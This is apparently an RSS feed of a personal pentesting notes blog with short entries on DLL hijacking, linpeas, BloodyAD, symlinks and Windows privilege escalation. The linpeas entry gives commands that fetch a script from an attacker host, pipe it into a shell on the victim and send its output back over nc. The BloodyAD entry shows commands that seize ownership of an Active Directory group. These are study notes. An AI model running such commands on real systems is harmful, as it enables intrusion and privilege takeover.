<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>PrivEsc on Owlglass</title>
    <link>http://localhost:1313/tags/privesc/</link>
    <description>Recent content in PrivEsc on Owlglass</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="http://localhost:1313/tags/privesc/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>DLL Hijacking</title>
      <link>http://localhost:1313/posts/dll_hijacking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/dll_hijacking/</guid>
      <description>&lt;h2 id=&#34;basic-ideas&#34;&gt;Basic Ideas&lt;/h2&gt;&#xA;&lt;p&gt;Windows DLL hijacking occurs when a trusted or legitimate application is tricked into loading an arbitrary DLL.  Dll hijacking can be used to execute code, obtain persistence and escalate privileges, although privilege escalation is the least likely.  &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking&#34;&gt;hackTricks&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;approaches&#34;&gt;Approaches&lt;/h3&gt;&#xA;&lt;p&gt;There are different approaches to DLL hijacking, and success will be determined by how the application is set to load its DLLs.&lt;/p&gt;&#xA;&lt;p&gt;1.&lt;/p&gt;</description>
    </item>
    <item>
      <title>linpeas</title>
      <link>http://localhost:1313/posts/linpeas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/linpeas/</guid>
      <description>&lt;p&gt;See carlospolop : &lt;a href=&#34;https://github.com/carlospolop/PEASS-ng&#34;&gt;PEASS-ng&lt;/a&gt;  &lt;a href=&#34;https://book.hacktricks.xyz/&#34;&gt;hacktricks&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;execution&#34;&gt;Execution:&lt;/h2&gt;&#xA;&lt;p&gt;Run from memory and send back to attacker:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Local network&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python -m SimpleHTTPServer &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl 10.10.10.10/linpeas.sh | sh &lt;span style=&#34;color:#75715e&#34;&gt;#Victim&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Without curl&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nc -q &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &amp;lt; linpeas.sh &lt;span style=&#34;color:#75715e&#34;&gt;#Host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh &lt;span style=&#34;color:#75715e&#34;&gt;#Victim&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Excute from memory and send output back to the host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt; | tee linpeas.out &lt;span style=&#34;color:#75715e&#34;&gt;#Host&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Victim&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Pentest - Active Directory - BloodyAD</title>
      <link>http://localhost:1313/posts/pentest_active_directory_bloodyad/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/pentest_active_directory_bloodyad/</guid>
      <description>&lt;h2 id=&#34;bloodyad&#34;&gt;BloodyAD&lt;/h2&gt;&#xA;&lt;p&gt;Privilege Escalation&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&#xA;&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&#xA;&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$IP&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;domain.htb&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;user&amp;gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;password&amp;gt;&amp;#34;&lt;/span&gt; set owner &amp;lt;group&amp;gt; &amp;lt;user&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$IP&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;domain.htb&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;user&amp;gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;password&amp;gt;&amp;#34;&lt;/span&gt; add groupMember &amp;lt;group&amp;gt; &amp;lt;user&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/CravateRouge/bloodyAD&#34;&gt;CravateRouge&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Pentest - Symbolic Links</title>
      <link>http://localhost:1313/posts/pentest_symbolic_links/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/pentest_symbolic_links/</guid>
      <description>&lt;h2 id=&#34;symbolic-links&#34;&gt;Symbolic Links&lt;/h2&gt;&#xA;&lt;h3 id=&#34;windows&#34;&gt;Windows&lt;/h3&gt;&#xA;&lt;p&gt;The &lt;code&gt;C:&lt;/code&gt; directory isn&amp;rsquo;t a real directory on disk, but a symbolic link object in the &lt;a href=&#34;http://localhost:1313/posts/windows_kernel_object_manager/&#34;&gt;Windows Kernel - Object Manager&lt;/a&gt;   namespace, which is isolated from the regular file system. The symbolic link holds the value of the physical path on the file system, the real device. The kernel calls &lt;code&gt;ObpParseSymbolicLink&lt;/code&gt; to resolve the symlink.&lt;/p&gt;&#xA;&lt;p&gt;A regular user is limited in the creation and deletion of symlinks in the object manager. She can&amp;rsquo;t create/delete new symlinks under most object directories, such as &lt;code&gt;\Driver&lt;/code&gt; or &lt;code&gt;\Global??&lt;/code&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Pentest - Windows Privilege Escalation</title>
      <link>http://localhost:1313/posts/pentest_windows_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/pentest_windows_privilege_escalation/</guid>
      <description>&lt;h2 id=&#34;from-service-to-system&#34;&gt;From Service to &lt;code&gt;SYSTEM&lt;/code&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;service-account-privileges&#34;&gt;Service Account Privileges&lt;/h3&gt;&#xA;&lt;p&gt;Services can be run such that they don&amp;rsquo;t maintain the privs of &lt;code&gt;NT AUTHORITY\LOCAL SERVICE&lt;/code&gt; account, eg with the &lt;code&gt;-k LocalServiceAndNoImpersonation&lt;/code&gt; option.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/images/impersonate.png&#34;&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;The task scheduler can be used to restore default privs: &lt;a href=&#34;https://github.com/itm4n/FullPowers.git&#34;&gt;FullPowers&lt;/a&gt; &lt;a href=&#34;https://itm4n.github.io/localservice-privileges/&#34;&gt;itm4n&lt;/a&gt;. After executing FullPowers:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/images/fullPowers.png&#34;&gt;&#xA;&lt;/figure&gt;</description>
    </item>
  </channel>
</rss>
